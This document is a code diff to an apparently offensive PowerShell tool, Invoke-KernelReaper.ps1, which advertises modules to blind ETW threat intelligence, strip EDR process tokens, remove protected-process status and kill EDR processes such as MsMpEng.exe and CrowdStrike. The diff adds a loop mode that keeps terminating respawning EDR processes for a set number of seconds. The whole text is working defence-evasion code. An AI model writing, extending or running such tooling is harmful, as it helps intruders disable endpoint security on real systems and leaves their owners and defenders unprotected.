@@ -38,6 +38,7 @@ param(
     [switch]$All,
     [switch]$CallbacksDryRun,
     [string]$DebugLog = "",
+    [int]$KillDuration = 0,
     [Alias('h')][switch]$Help
 )
 
@@ -58,6 +59,7 @@ function Show-Help {
     Write-Host "    -ETWBlind           Disable ETW Threat Intelligence provider"
     Write-Host "    -TokenDowngrade     Strip privileges from EDR process tokens"
     Write-Host "    -EDRKill            Terminate EDR processes (strips protections first)"
+    Write-Host "    -KillDuration <sec> Keep killing respawning EDR processes for N seconds"
     Write-Host "    -All                Run all modules"
     Write-Host ""
     Write-Host "  Options:" -ForegroundColor Yellow
@@ -73,6 +75,7 @@ function Show-Help {
     Write-Host "    .\Invoke-KernelReaper.ps1 -RemovePPL"
     Write-Host "    .\Invoke-KernelReaper.ps1 -Callbacks -ETWBlind"
     Write-Host "    .\Invoke-KernelReaper.ps1 -EDRKill -TargetEDR `"MsMpEng.exe,CrowdStrike.exe`""
+    Write-Host "    .\Invoke-KernelReaper.ps1 -EDRKill -KillDuration 300"
     Write-Host "    .\Invoke-KernelReaper.ps1 -All"
     Write-Host ""
     exit 0
@@ -1299,10 +1302,31 @@ try {
     # 5. EDR Kill (strip PPL + token + kill)
     if ($EDRKill) {
         Write-Host "`n--- EDR Kill ---" -ForegroundColor Cyan
-        if ($TargetPID.Count -gt 0) {
-            [PPLRemover]::DoEDRKill($hDev, $off, $ntBase, [int[]]$TargetPID) | Out-Null
+        if ($KillDuration -gt 0) {
+            Write-Host "[KILL] Loop mode: killing EDR processes for $KillDuration seconds (Ctrl+C to stop)" -ForegroundColor Yellow
+            $deadline = (Get-Date).AddSeconds($KillDuration)
+            $pass = 0
+            while ((Get-Date) -lt $deadline) {
+                $pass++
+                $killed = 0
+                if ($TargetPID.Count -gt 0) {
+                    $killed = [PPLRemover]::DoEDRKill($hDev, $off, $ntBase, [int[]]$TargetPID)
+                } else {
+                    $killed = [PPLRemover]::DoEDRKillByName($hDev, $off, $ntBase, [string[]]$edrList)
+                }
+                $remaining = [math]::Round(($deadline - (Get-Date)).TotalSeconds)
+                if ($killed -gt 0) {
+                    Write-Host "[KILL] Pass $pass : $killed process(es) killed, ${remaining}s remaining" -ForegroundColor Green
+                }
+                if ((Get-Date) -lt $deadline) { Start-Sleep -Seconds 2 }
+            }
+            Write-Host "[KILL] Duration expired after $pass passes" -ForegroundColor Yellow
         } else {
-            [PPLRemover]::DoEDRKillByName($hDev, $off, $ntBase, [string[]]$edrList) | Out-Null
+            if ($TargetPID.Count -gt 0) {
+                [PPLRemover]::DoEDRKill($hDev, $off, $ntBase, [int[]]$TargetPID) | Out-Null
+            } else {
+                [PPLRemover]::DoEDRKillByName($hDev, $off, $ntBase, [string[]]$edrList) | Out-Null
+            }
         }
     }
 
